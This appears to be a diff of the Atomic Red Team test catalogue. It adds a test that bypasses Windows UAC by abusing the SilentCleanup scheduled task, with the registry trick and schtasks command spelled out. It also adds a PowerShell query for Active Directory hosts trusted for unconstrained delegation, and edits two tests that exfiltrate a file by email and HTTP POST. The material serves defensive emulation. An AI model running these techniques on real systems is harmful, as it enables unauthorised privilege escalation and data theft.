@@ -10120,6 +10120,31 @@ privilege-escalation:
 '
         name: command_prompt
         elevation_required: true
+    - name: Bypass UAC using SilentCleanup task
+      auto_generated_guid: 28104f8a-4ff1-4582-bcf6-699dce156608
+      description: |
+        Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+        There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+
+        For example, we can set the windir registry kye to: "cmd /k REM "
+
+        And forcefully run SilentCleanup task:
+
+        schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+        REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path to the bat file
+          type: String
+          default: PathToAtomicsFolder\T1548.002\src\T1548.002.bat
+      executor:
+        command: "#{file_path}\n"
+        name: command_prompt
+        elevation_required: false
   T1574.012:
     technique:
       external_references:
@@ -19315,6 +19340,31 @@ defense-evasion:
 '
         name: command_prompt
         elevation_required: true
+    - name: Bypass UAC using SilentCleanup task
+      auto_generated_guid: 28104f8a-4ff1-4582-bcf6-699dce156608
+      description: |
+        Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/
+
+        There is an auto-elevated task called SilentCleanup located in %windir%\system32\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).
+
+        For example, we can set the windir registry kye to: "cmd /k REM "
+
+        And forcefully run SilentCleanup task:
+
+        schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+
+        REM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_path:
+          description: Path to the bat file
+          type: String
+          default: PathToAtomicsFolder\T1548.002\src\T1548.002.bat
+      executor:
+        command: "#{file_path}\n"
+        name: command_prompt
+        elevation_required: false
   T1218.003:
     technique:
       external_references:
@@ -28887,11 +28937,9 @@ defense-evasion:
           description: SMTP Server IP Address
           type: string
           default: 127.0.0.1
-      dependency_executor_name: powershell
       executor:
-        command: '"Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1027
-          Atomic Test" -Attachments PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
-          -SmtpServer #{smtp_server}"
+        command: 'Send-MailMessage -From #{sender} -To #{receiver} -Subject ''T1027_Atomic_Test''
+          -Attachments #{input_file} -SmtpServer #{smtp_server}
 
 '
         name: powershell
@@ -28911,9 +28959,8 @@ defense-evasion:
           description: Destination IP address
           type: string
           default: 127.0.0.1
-      dependency_executor_name: powershell
       executor:
-        command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
+        command: 'Invoke-WebRequest -Uri #{ip_address} -Method POST -Body #{input_file}
 
 '
         name: powershell
@@ -49382,6 +49429,49 @@ discovery:
 
 '
         name: command_prompt
+    - name: Enumerate Active Directory for Unconstrained Delegation
+      auto_generated_guid: 46f8dbe9-22a5-4770-8513-66119c5be63b
+      description: |
+        Attackers may attempt to query for computer objects with the UserAccountControl property
+        'TRUSTED_FOR_DELEGATION' (0x80000;524288) set
+        More Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce
+        Prerequisite: AD RSAT PowerShell module is needed and it must run under a domain user
+      supported_platforms:
+      - windows
+      input_arguments:
+        domain:
+          description: Domain FQDN
+          type: String
+          default: contoso.com
+        uac_prop:
+          description: UAC Property to search
+          type: String
+          default: 524288
+      dependencies:
+      - description: 'PowerShell ActiveDirectory Module must be installed
+
+'
+        prereq_command: |
+          Try {
+              Import-Module ActiveDirectory -ErrorAction Stop | Out-Null
+              exit 0
+          }
+          Catch {
+              exit 1
+          }
+        get_prereq_command: |
+          if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {
+            Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online
+          } else {
+            Install-WindowsFeature RSAT-AD-PowerShell
+          }
+      executor:
+        name: powershell
+        elevation_required: false
+        command: 'Get-ADObject -LDAPFilter ''(UserAccountControl:1.2.840.113556.1.4.803:=#{uac_prop})''
+          -Server #{domain}
+
+'
   T1069.002:
     technique:
       external_references:
